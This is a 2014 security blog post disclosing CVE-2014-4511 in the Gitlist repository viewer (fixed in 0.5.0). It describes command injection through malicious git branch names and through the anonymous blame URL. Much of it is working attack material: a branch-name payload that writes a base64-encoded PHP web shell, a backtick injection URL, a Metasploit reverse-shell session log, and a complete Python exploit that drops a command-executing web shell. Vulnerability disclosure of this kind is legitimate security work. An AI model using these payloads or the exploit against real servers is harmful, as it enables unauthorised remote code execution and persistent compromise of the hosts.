---
categories:
- rce
- gitlist
comments: false
date: "2014-06-29T15:00:00Z"
title: gitlist - commit to rce
---

[Gitlist](http://gitlist.org/) is a fantastic repository viewer for Git; it's essentially your own private Github without all the social networking and glitzy features of it.  I've got a private Gitlist that I run locally, as well as a professional instance for hosting internal projects.  Last year I noticed a bug listed on their Github page that looked a lot like an exploitable [hole](https://github.com/klaussilveira/gitlist/issues/395):

```
Oops! sh: 1: Syntax error: EOF in backquote substitution
```

I commented on its exploitability at the time, and though the hole appears to be closed, the issue still remains.  I returned to this during an install of Gitlist and decided to see if there were any other bugs in the application and, as it turns out, there are a few.  I discovered a handful of bugs during my short hunt that I'll document here, including one anonymous remote code execution vulnerability that's quite trivial to pop.  These bugs were reported to the developers and CVE-2014-4511 was assigned.  These issues were fixed in version 0.5.0.

The first bug is actually more of a vulnerability in a library Gitlist uses, Gitter (same developers).  Gitter allows developers to interact with Git repositories using Object-Oriented Programming (OOP).  During a quick once-over of the code, I noticed the library shelled out quite a few times, and one in particular stood out to me:

```
$hash = $this->getClient()->run($this, "log --pretty=\"%T\" --max-count=1 $branch");```
```

This can be found in `Repository.php` of the Gitter library, and is invoked from `TreeController.php` in Gitlist.  As you can imagine, there is no sanitization on the `$branch` variable.  This essentially means that anyone with commit access to the repository can create a malicious branch name (locally or remotely) and end up executing arbitrary commands on the server.

The tricky part comes with the branch name; git actually has a couple restrictions on what can and cannot be part of a branch name.  This is all defined and checked inside of [refs.c](https://github.com/git/git/blob/cb682f8cfe63ecd0da08a526f404d295e51e3ab1/refs.c), and the rules are simply defined as (starting at line 33):

1.  Cannot begin with .
2.  Cannot have a double dot (..)
3.  Cannot contain ASCII control characters (?, [, ], ~, ^, :, \\)
4.  End with /
5.  End with .lock
6.  Contain a backslash
7.  Cannot contain a space

With these restrictions in mind, we can begin crafting our payload.

My first thought was, because Gitlist is written in PHP, to drop a web shell.  To do so we must print our payload out to a file in a location accessible to the web root.  As it so happens, we have just the spot to do it.  According to INSTALL.md, the following is required:

```
cd /var/www/gitlist
mkdir cache
chmod 777 cache
```

This is perfect; we have a _reliable_ location with 777 permissions and it's accessible from the web root (/gitlist/cache/my_shell.php).  Second step is to come up with a payload that adheres to the Git branch rules while still giving us a shell.  What I came up with is as follows:

```
# git checkout -b "|echo\$IFS\"PD9zeXN0ZW0oJF9SRVFVRVNUWyd4J10pOz8+Cg==\"|base64\$IFS-d>/var/www/gitlist/cache/x"
```

In order to inject PHP, we need the <? and ?> headers, so we need to encode our PHP payload.  We use the $IFS environment variable (Internal Field Separator) to plug in our spaces and echo the base64'd shell into `base64` for decoding, then pipe that into our payload location.

And it works flawlessly.

Though you might say, "Hey if you have commit access it's game over", but I've seen several instances of this not being the case.  Commit access does not necessarily equate to shell access.

The second vulnerability I discovered was a trivial RCE, exploitable by anonymous users without any access.  I first noticed the bug while browsing the source code, and ran into this:

```
$blames = $repository->getBlame("$branch -- \"$file\"");
```

Knowing how often they shell out, and the complete lack of input sanitization, I attempted to pop this by trivially evading the double quotes and injecting grave accents:

```
http://localhost/gitlist/my_repo.git/blame/master/""`whoami`
```

And what do you know?

{{< figure src="/images/posts/2014/gitlist_rce1.jpg" >}}

Curiousity quickly overcame me, and I attempted another vector:

{{< figure src="/images/posts/2014/gitlist_rce2.jpg" >}}

Faster my fingers flew:

{{< figure src="/images/posts/2014/gitlist_rce3.jpg" >}}

It's terrifyingly clear that _everything_ is an RCE.  I developed a rough PoC to drop a web shell on the system.  A test run of this is below:

```
root@droot:~/exploits# python gitlist_rce.py http://192.168.1.67/gitlist/graymatter
[!] Using cache location /var/www/gitlist/cache
[!] Shell dropped; go hit http://192.168.1.67/gitlist/cache/x.php?cmd=ls
root@droot:~/exploits# curl http://192.168.1.67/gitlist/cache/x.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
root@droot:~/exploits# 
```

I've also developed a Metasploit module for this issue, which I'll be submitting a PR for soon.  A run of it:

```
msf exploit(gitlist_rce) > rexploit
[*] Reloading module...

[*] Started reverse handler on 192.168.1.6:4444 
[*] Injecting payload...
[*] Executing payload..
[*] Sending stage (39848 bytes) to 192.168.1.67
[*] Meterpreter session 9 opened (192.168.1.6:4444 -> 192.168.1.67:34241) at 2014-06-21 23:07:01 -0600

meterpreter > sysinfo
Computer    : bryan-VirtualBox
OS          : Linux bryan-VirtualBox 3.2.0-63-generic #95-Ubuntu SMP Thu May 15 23:06:36 UTC 2014 i686
Meterpreter : php/php
meterpreter > 
```

Source for the standalone Python exploit can be found below.

```
from commands import getoutput
import urllib
import sys

""" 
Exploit Title: Gitlist <= 0.4.0 anonymous RCE
Date: 06/20/2014
Author: drone (@dronesec)
Vendor Homepage: http://gitlist.org/
Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz
Version: <= 0.4.0
Tested on: Debian 7
More information: 
cve: CVE-2014-4511
"""

if len(sys.argv) <= 1:
    print '%s: [url to git repo] {cache path}' % sys.argv[0]
    print '  Example: python %s http://localhost/gitlist/my_repo.git' % sys.argv[0]
    print '  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache' % sys.argv[0]
    sys.exit(1)

url = sys.argv[1]
url = url if url[-1] != '/' else url[:-1]

path = "/var/www/gitlist/cache"
if len(sys.argv) > 2:
    path = sys.argv[2]

print '[!] Using cache location %s' % path

# payload <?system($_GET['cmd']);?>
payload = "PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo="

# sploit; python requests does not like this URL, hence wget is used
mpath = '/blame/master/""`echo {0}|base64 -d > {1}/x.php`'.format(payload, path)
mpath = url+ urllib.quote(mpath)

out = getoutput("wget %s" % mpath)
if '500' in out:
    print '[!] Shell dropped; go hit %s/cache/x.php?cmd=ls' % url.rsplit('/', 1)[0]
else:
    print '[-] Failed to drop'
    print out
```
